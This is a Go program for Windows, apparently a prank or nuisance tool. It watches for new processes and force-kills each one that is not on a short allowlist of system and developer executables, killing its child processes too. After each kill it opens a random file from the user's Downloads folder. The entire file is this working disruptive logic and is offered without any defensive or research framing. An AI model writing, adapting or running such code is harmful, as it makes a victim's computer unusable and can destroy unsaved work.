package main

import (
	"fmt"
	"github.com/mitchellh/go-ps"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

func main() {
	programOpened := map[int]bool{}
	importantProcesses := map[string]bool{
		"explorer.exe":                true,
		"powershell.exe":              true,
		"svchost.exe":                 true,
		"wininit.exe":                 true,
		"winlogon.exe":                true,
		"lsass.exe":                   true,
		"services.exe":                true,
		"csrss.exe":                   true,
		"smss.exe":                    true,
		"System":                      true,
		"Registry":                    true,
		"System Idle":                 true,
		"System Interrupts":           true,
		"System Task":                 true,
		"goland64.exe":                true,
		"gofmt.exe":                   true,
		"git.exe":                     true,
		"taskkill.exe":                true,
		"conhost.exe":                 true,
		"dllhost.exe":                 true,
		"cmd.exe":                     true,
		"OpenWith.exe":                true,
		"consent.exe":                 true,
		"msiexec.exe":                 true,
		"SearchProtocolHost.exe":      true,
		"mchost.exe":                  true,
		"RuntimeBroker.exe":           true,
		"ApplicationFrameHost.exe":    true,
		"ShellExperienceHost.exe":     true,
		"StartMenuExperienceHost.exe": true,
		"backgroundTaskHost.exe":      true,
	}
	homeDir, err := os.UserHomeDir()
	if err != nil {
		panic(err)
	}

	downloadsDir := filepath.Join(homeDir, "Downloads")

	fmt.Println(downloadsDir)

	files, err := ioutil.ReadDir(downloadsDir)
	if err != nil {
		fmt.Println("Error reading directory:", err)
		return
	}
	// Get a list of all processes running on the system
	processes, err := ps.Processes()
	if err != nil {
		fmt.Println("Error getting processes: ", err)
		return
	}

	// Loop continuously to detect new processes
	for {
		newProcesses, err := ps.Processes()
		if err != nil {
			fmt.Println("Error getting new processes: ", err)
			continue
		}

		// Compare the current list of processes with the new list
		for _, newProcess := range newProcesses {
			found := false
			for _, process := range processes {
				if newProcess.Pid() == process.Pid() {
					found = true
					break
				}
			}

			// If the process is not in the current list, it's new
			if !found {
				//fmt.Printf("New process detected: %d\t%s\n", newProcess.Pid(), newProcess.Executable())
				if !importantProcesses[newProcess.Executable()] && !programOpened[newProcess.Pid()] {
					go func() {
						kill := exec.Command("TASKKILL", "/T", "/F", "/IM", newProcess.Executable())
						fmt.Println("TASKKILL", "/T", "/F", "/IM", newProcess.Executable(), newProcess.Pid())
						kill.Stderr = os.Stderr
						kill.Stdout = os.Stdout
						err := kill.Run()
						if err != nil {
							fmt.Println("kill error", newProcess.Executable(), err)
						}

						if len(files) == 0 {
							fmt.Println("No files found in Downloads directory")
							return
						}
						randomIndex := rand.Intn(len(files))
						randomFile := files[randomIndex]

						// Open the file.
						filePath := filepath.Join(downloadsDir, randomFile.Name())
						// open the file using the default program associated with it
						cmd := exec.Command("cmd", "/c", "start", filePath)
						err = cmd.Run()
						if err != nil {
							fmt.Println("Error opening file:", err)
							return
						}

						// Get the process ID of the program that opened the file.
						pid := cmd.Process.Pid
						programOpened[pid] = true
					}()
				} else {
					//fmt.Println("Process is important and will not be terminated.:", newProcess.Executable())
				}
			}
		}

		// Update the current list of processes
		processes = newProcesses

		// Sleep for a short interval before checking for new processes again
		time.Sleep(5 * time.Millisecond)
	}
}
